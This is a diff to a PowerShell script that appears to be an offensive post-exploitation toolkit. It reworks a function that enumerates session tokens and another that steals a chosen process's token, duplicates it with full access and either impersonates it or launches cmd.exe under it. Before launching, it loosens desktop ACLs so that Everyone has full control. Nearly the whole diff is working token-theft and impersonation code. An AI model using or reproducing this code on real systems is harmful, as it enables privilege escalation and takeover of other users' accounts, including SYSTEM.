@@ -5601,7 +5601,7 @@ function ListSessionTokens
 	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
 	If (-not $Succeeded)
 	{
-		Write-Host ("[-] EnumProcesses() failed`n")
+		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
@@ -5696,6 +5696,7 @@ function ListSessionTokens
 				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
 				$LogonID = $Cast.AuthenticationId.LowPart
 				$TokenType = $Cast.TokenType
+				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 
 				### SID to UserName/Domain ###
 				$cchName = 0
@@ -5708,7 +5709,6 @@ function ListSessionTokens
 					{
 						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 						Continue
 					}
 				}
@@ -5720,7 +5720,6 @@ function ListSessionTokens
 				{
 					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
 					Continue
 				}
 				
@@ -5736,6 +5735,7 @@ function ListSessionTokens
 					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
 					$Discard = [TokensAPI]::CloseHandle($LuidPtr)
+					$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
 					Continue
 				}
 				Else
@@ -5744,11 +5744,13 @@ function ListSessionTokens
 					$LogonType = $LogonSessionData.LogonType
 				}
 				
-				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
-				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
 				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
 				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
+				$Discard = [TokensAPI]::CloseHandle($LuidPtr)
+				$Discard = [TokensAPI]::CloseHandle($LogonSessionDataPtr)
+				
+				# ProcessID:SessionID:Domain:UserName:SID:LogonID:TokenType:LogonType
+				Write-Host ("[+] {0}:{1}:{2}:{3}:{4}:{5}:{6}:{7}" -f ($ProcessIds[$i], $SessionID, $Domain, $UserName, $SID, $LogonID, $TokenType, $LogonType))
 			}
 		}
 	}
@@ -5756,10 +5758,16 @@ function ListSessionTokens
 	return
 }
 
-function ImpersonateToken($SIDToImpersonate, $LogonTypeToImpersonate, $Method)
+function ImpersonateToken($ProcID, $Method)
 {
-	Write-Host ("`n[+] Try to impersonate Session Token with SID = {0}" -f ($SIDToImpersonate))
-	$SIDFound = $False
+	If ((-not $ProcID) -or (-not $Method))
+	{
+		Write-Host ("`n[-] You must provide ProcID and Method parameters`n" -f ($SIDToImpersonate))
+		return
+	}
+	
+	Write-Host ("`n[+] Try to impersonate Session Token of process ID = {0}" -f ($ProcID))
+	$ProcFound = $False
 	
 	# Load Tokens functions
 	LoadTokensAPI
@@ -5771,11 +5779,6 @@ function ImpersonateToken($SIDToImpersonate, $LogonTypeToImpersonate, $Method)
 		return
 	}
 
-	# Get current proccess ID and session ID
-	$CurProcID = [System.Diagnostics.Process]::GetCurrentProcess().Id
-	$CurSessionID = 0
-	$Res = [TokensAPI]::ProcessIdToSessionId($CurProcID, [ref]$CurSessionID)
-
 	# Enumerate all processes
 	$ArrayMaxProcesses = 100
 	$ArrayBytesSize = $ArrayMaxProcesses * [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
@@ -5784,7 +5787,7 @@ function ImpersonateToken($SIDToImpersonate, $LogonTypeToImpersonate, $Method)
 	$Succeeded = [TokensAPI]::EnumProcesses($ProcessIds, $ArrayBytesSize, [ref]$BytesCopied)
 	If (-not $Succeeded)
 	{
-		Write-Host ("[-] EnumProcesses() failed`n")
+		Write-Host ("[-] EnumProcesses() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 		return
 	}
 	$NbProcesses = $BytesCopied / [System.Runtime.InteropServices.Marshal]::SizeOf((New-Object UInt32))
@@ -5798,220 +5801,119 @@ function ImpersonateToken($SIDToImpersonate, $LogonTypeToImpersonate, $Method)
 	# Open each process
 	For ($i = 0; $i -lt $NbProcesses; $i += 1)
 	{
-		# Get this process session ID
-		$SessionID = 0
-		$Res = [TokensAPI]::ProcessIdToSessionId($ProcessIds[$i], [ref]$SessionID)
-
-		$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
-		If ($ProcHandle.ToInt64())
+		If ($ProcID -eq $ProcessIds[$i])
 		{
+			$ProcFound = $True
+			$ProcHandle = [TokensAPI]::OpenProcess([TokensAPI+ProcessAccessFlags]::PROCESS_QUERY_INFORMATION, $False, $ProcessIds[$i])
+			If (-not $ProcHandle.ToInt64())
+			{
+				Write-Host ("[-] OpenProcess() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				return
+			}
+			
 			$TokenHandle = New-Object IntPtr
 			$Succeeded = [TokensAPI]::OpenProcessToken($ProcHandle, [TokensAPI]::TOKEN_DUPLICATE -bor [TokensAPI]::TOKEN_READ -bor [TokensAPI]::TOKEN_QUERY, [ref]$TokenHandle)
-			If ($Succeeded)
+			If (-not $Succeeded)
 			{
-				# Get token information
-				$TokenInfoLength = 0
-
-				### TokenUser: SIDPtr to string SID ###
-				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, 0, $TokenInfoLength, [ref]$TokenInfoLength)
+				Write-Host ("[-] OpenProcessToken() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+				return
+			}
+			
+			$DupToken = New-Object IntPtr
+			$lpTokenAttributes = New-Object TokensAPI+SECURITY_ATTRIBUTES
+			$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
+			If (-not $Succeeded)
+			{
+				Write-Host ("[-] DuplicateTokenEx() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+				$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+				$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+				return
+			}
+			
+			If ($Method -eq "ImpersonateLoggedOnUser")
+			{
+				$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
 				If (-not $Succeeded)
 				{
-					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
-					{
-						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						Continue
-					}
-				}
-
-				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
-				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenUser, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
-				If (-not $Succeeded)
-				{
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-					Continue
-				}
-
-				$TokenInfo = New-Object TokensAPI+TOKEN_USER
-				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
-
-				$SIDPtr = $Cast.User.Sid
-				$SIDPtrString = 0
-				$Succeeded = [TokensAPI]::ConvertSidToStringSid($SIDPtr, [ref]$SIDPtrString)
-				If (-not $Succeeded)
-				{
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-					Continue
-				}
-				$SID = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($SIDPtrString)
-				[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-				
-				### TokenStatistics: AuthenticationID, LogonID, TokenType ###
-				$TokenInfoLength = 0
-				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, 0, $TokenInfoLength, [ref]$TokenInfoLength)
-				If (-not $Succeeded)
-				{
-					If ([TokensAPI]::GetLastError() -ne [TokensAPI]::ERROR_INSUFFICIENT_BUFFER)
-					{
-						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						Continue
-					}
-				}
-
-				[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenInfoLength)
-				$Succeeded = [TokensAPI]::GetTokenInformation($TokenHandle, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenStatistics, $TokenInfoPtr, $TokenInfoLength, [ref]$TokenInfoLength)
-				If (-not $Succeeded)
-				{
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenInfoPtr)
-					Continue
-				}
-
-				$TokenInfo = New-Object TokensAPI+TOKEN_STATISTICS
-				$Cast = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenInfoPtr, [Type]$TokenInfo.GetType())
-				$LogonID = $Cast.AuthenticationId.LowPart
-				$TokenType = $Cast.TokenType
-				
-				### Get LogonType ###
-				$LuidPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object TokensAPI+LUID).GetType()))
-				[System.Runtime.InteropServices.Marshal]::StructureToPtr($Cast.AuthenticationId, $LuidPtr, $False)
-
-				[IntPtr]$LogonSessionDataPtr = [IntPtr]::Zero
-				$ReturnVal = [TokensAPI]::LsaGetLogonSessionData($LuidPtr, [Ref]$LogonSessionDataPtr)
-				If ($ReturnVal -ne 0 -and $LogonSessionDataPtr -eq [IntPtr]::Zero)
-				{
-					Write-Host ("LsaGetLogonSessionData() failed with error {0}" -f ([TokensAPI]::GetLastError()))
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-					$Discard = [TokensAPI]::CloseHandle($LuidPtr)
-					Continue
+					Write-Host ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 				}
 				Else
 				{
-					$LogonSessionData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($LogonSessionDataPtr, [Type](New-Object TokensAPI+SECURITY_LOGON_SESSION_DATA).GetType())
-					$LogonType = $LogonSessionData.LogonType
+					Write-Host ("[+] Successfully impersonated token of requested process ID with ImpersonateLoggedOnUser()`n")
 				}
-
-				If (($SID -eq $SIDToImpersonate) -and ($LogonType -eq $LogonTypeToImpersonate))
+			}
+			Else
+			{
+				If ($Method -eq "CreateProcessWithToken")
 				{
-					$SIDFound = $True
-					$DupToken = New-Object IntPtr
-					$lpTokenAttributes = New-Object TokensAPI+SECURITY_ATTRIBUTES
-					$Succeeded = [TokensAPI]::DuplicateTokenEx($TokenHandle, [TokensAPI]::TOKEN_ALL_ACCESS, [ref]$lpTokenAttributes, [TokensAPI+SECURITY_IMPERSONATION_LEVEL]::SecurityImpersonation, [TokensAPI+TOKEN_TYPE]::TokenPrimary, [ref]$DupToken)
+					# This method allow to spawn a graphical process
+					# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
+					# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
+					# https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
+					Set-DesktopACLs
+					
+					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
+					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
+					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
+					$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, 0, 0, $CmdLinePtr, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
 					If (-not $Succeeded)
 					{
-						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-						Continue
-					}
-					
-					If ($Method -eq "ImpersonateLoggedOnUser")
-					{
-						$Succeeded = [TokensAPI]::ImpersonateLoggedOnUser($DupToken)
-						If (-not $Succeeded)
-						{
-							Write-Host ("[-] ImpersonateLoggedOnUser() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
-						}
-						Else
-						{
-							Write-Host ("[+] Successfully impersonated token for requested SID with ImpersonateLoggedOnUser()`n")
-						}
+						Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
 					}
 					Else
 					{
-						If ($Method -eq "CreateProcessWithTokenW")
-						{
-							# This method allow to spawn a graphical process
-							# When impersonating another user than NT\SYSTEM, this user will not have full permission on the Window Station and Desktop objects and the GUI will be partially rendered
-							# Thus It is required to add an ACL to grant the "Everyone" group full control of the current Windows Station and Desktop
-							# https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/
-							Set-DesktopACLs
-							
-							<#
-								Other method with SetTokenInformation() to edit duplicate token session ID to match ours
-								It required NT\SYSTEM access with SeTcbPrivilege
-							#>
-							<#
-							[IntPtr]$TokenInfoPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
-							$Bytes = [System.BitConverter]::GetBytes([UInt32]$CurSessionID)
-							[System.Runtime.InteropServices.Marshal]::Copy($Bytes, 0, $TokenInfoPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
-							$Succeeded = [TokensAPI]::SetTokenInformation($DupToken, [TokensAPI+TOKEN_INFORMATION_CLASS]::TokenSessionId, $TokenInfoPtr, [System.Runtime.InteropServices.Marshal]::SizeOf([Type](New-Object UInt32).GetType()))
-							If (-not $Succeeded)
-							{
-								Write-host ("[-] SetTokenInformation() failed with error {0}" -f ([TokensAPI]::GetLastError()))
-								
-								$Discard = [TokensAPI]::CloseHandle($DupToken)
-								$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-								$Discard = [TokensAPI]::CloseHandle($TokenHandle)
-								
-								return
-							}
-							#>
-							
-							$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
-							$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
-							$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
-							$Succeeded = [TokensAPI]::CreateProcessWithTokenW($DupToken, 0, 0, $CmdLinePtr, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
-							If (-not $Succeeded)
-							{
-								Write-Host ("[-] CreateProcessWithTokenW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
-							}
-							Else
-							{
-								Write-Host ("[+] Successfully impersonated token for requested SID with CreateProcessWithTokenW()`n")
-							}
-							
-							
-							[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
-						}
-						ElseIf ($Method -eq "CreateProcessAsUserW")
-						{
-							# This method allow to spawn a terminal process
-							# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
-							If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
-							{
-								Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
-								return
-							}
-						
-							$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
-							$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
-							$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe /c cmd")
-							$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
-							If (-not $Succeeded)
-							{
-								Write-Host ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
-							}
-							Else
-							{
-								Write-Host ("[+] Successfully impersonated token for requested SID with CreateProcessAsUserW()`n")
-								$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
-								Wait-Process -Id $SpawnProc.ProcessId
-							}
-							
-							[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
-						}
+						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessWithTokenW()`n")
 					}
 					
-					$Discard = [TokensAPI]::CloseHandle($DupToken)
-					$Discard = [TokensAPI]::CloseHandle($ProcHandle)
-					$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
+				}
+				ElseIf ($Method -eq "CreateProcessAsUser")
+				{
+					# This method allow to spawn a terminal process
+					# It require NT\SYSTEM access and SeAssignPrimaryTokenPrivilege for calling CreateProcessAsUserW()
+					If (-not (EnablePrivilege "SeAssignPrimaryTokenPrivilege"))
+					{
+						Write-Host ("[-] Failed to enable SeAssignPrimaryTokenPrivilege`n")
+						$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+						$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+						$Discard = [TokensAPI]::CloseHandle($DupToken)
+						return
+					}
+				
+					$lpStartupInfo = New-Object TokensAPI+STARTUPINFO
+					$lpProcessInformation = New-Object TokensAPI+PROCESS_INFORMATION
+					$CmdLinePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("C:\\Windows\\System32\\cmd.exe")
+					$Succeeded = [TokensAPI]::CreateProcessAsUserW($DupToken, 0, $CmdLinePtr, 0, 0, $False, 0, 0, 0, [ref]$lpStartupInfo, [ref]$lpProcessInformation)
+					If (-not $Succeeded)
+					{
+						Write-Host ("[-] CreateProcessAsUserW() failed with error {0}`n" -f ([TokensAPI]::GetLastError()))
+					}
+					Else
+					{
+						Write-Host ("[+] Successfully impersonated token of requested process ID with CreateProcessAsUserW()`n")
+						$SpawnProc = Get-CIMInstance -ClassName win32_process -filter "parentprocessid = '$($([System.Diagnostics.Process]::GetCurrentProcess().Id))'" | Select ProcessId
+						Wait-Process -Id $SpawnProc.ProcessId
+					}
 					
-					return
+					[System.Runtime.InteropServices.Marshal]::FreeHGlobal($CmdLinePtr)
+				}
+				Else
+				{
+					Write-Host ("[-] Unknown method '{0}' to impersonate Session Tokens`n" -f ($Method))
 				}
 			}
+			
+			$Discard = [TokensAPI]::CloseHandle($ProcHandle)
+			$Discard = [TokensAPI]::CloseHandle($TokenHandle)
+			$Discard = [TokensAPI]::CloseHandle($DupToken)
+			return
 		}
 	}
 
-	If (-not $SIDFound)
+	If (-not $ProcFound)
 	{
-		Write-Host ("[-] No Session Tokens found with this SID`n")
+		Write-Host ("[-] No process with ID {0} found`n" -f ($ProcID))
 	}
 
 	return
